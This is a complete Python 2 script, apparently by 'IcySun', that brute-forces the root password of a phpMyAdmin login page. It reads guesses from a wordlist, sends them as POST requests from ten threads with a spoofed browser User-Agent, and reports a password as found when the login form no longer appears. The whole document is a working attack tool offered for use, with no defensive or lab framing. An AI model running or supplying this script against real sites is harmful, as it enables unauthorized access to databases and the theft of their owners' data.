#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: IcySun
# 脚本功能：暴力破解phpMyadmin密码

from Queue import Queue
import threading,sys
import requests

def use():
    print '#' * 50
    print '\t Crack Phpmyadmin root\'s pass'
    print '\t\t\t Code By: IcySun'
    print '\t python crackPhpmyadmin.py http://xx.com/phpmyadmin/ \n\t    (default user is root)'

    print '#' * 50

def crack(password):
    global url
    payload = {'pma_username': 'root', 'pma_password': password}
    headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}
    r = requests.post(url, headers = headers, data = payload)
    if 'name="login_form"' not in r.content:
        print '[*] OK! Have Got The Pass ==> %s' % password

class MyThread(threading.Thread): 
    def __init__(self): 
        threading.Thread.__init__(self) 
    def run(self): 
        global queue 
        while not queue.empty(): 
            password = queue.get() 
            crack(password)

def main():
    global url,password,queue
    queue = Queue()
    url = sys.argv[1]
    passlist = open('password.txt','r')
    for password in passlist.readlines():
        password = password.strip()
        queue.put(password)

    for i in range(10): 
        c = MyThread() 
        c.start()

if __name__ == '__main__':
    if len(sys.argv) != 2 :
        use()
    else:
        main()

